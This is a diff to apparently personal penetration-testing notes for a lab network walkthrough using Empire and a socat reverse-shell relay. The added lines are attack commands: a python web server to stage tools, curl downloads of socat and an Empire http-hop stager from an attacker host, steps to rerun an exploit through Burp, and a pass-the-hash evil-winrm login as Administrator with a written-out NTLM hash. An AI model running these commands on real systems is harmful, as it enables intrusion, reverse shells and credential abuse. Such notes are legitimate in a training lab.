@@ -22,6 +22,20 @@ firewall-cmd --zone=public --add-port 22888/tcp
 
 **On the Webserver:**
 
+Preparation:
+
+```php
+cd /opt/static-binaries/binaries/
+```
+
+```php
+python -m SimpleHTTPServer 80
+```
+
+```php
+curl 10.50.55.235/socat -o /tmp/socat-Platos && chmod +x /tmp/socat-Platos
+```
+
 **SOCAT Reverse Shell Relay**
 
 In this scenario we are using **socat** to create a relay for us to send a reverse shell back to our own attacking machine. 
@@ -159,6 +173,14 @@ Create new stager
 zip -r hop.zip *
 ```
 
+```php
+curl 10.50.55.235/hop.zip -o hop.zip
+```
+
+```php
+unzip hop.zip
+```
+
 ![[Pasted image 20240722091152.png]]
 
 We now need to serve the files on the port we chose when generating the http_hop listener:
@@ -192,8 +214,19 @@ I get the agent back and complete this part.
 - Shell command is where you can use things like `whoami`
 
 ---
-
+After things get deleted:
+- Run stager again on prod-serv
+- Set up http-hop
+- Re-Transfer and zip the files from our own directory in `/tmp/http-hop/`
+- Exploit may need to be redone (/loot/43777.py)
+- Run Burp and use the exploit in `a` parameter
+- Everything should now be back as of yesterday, with two agents
+---
 # Final Machine in the Network
 
+win-rm scripts
 
+```php
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
+```
 
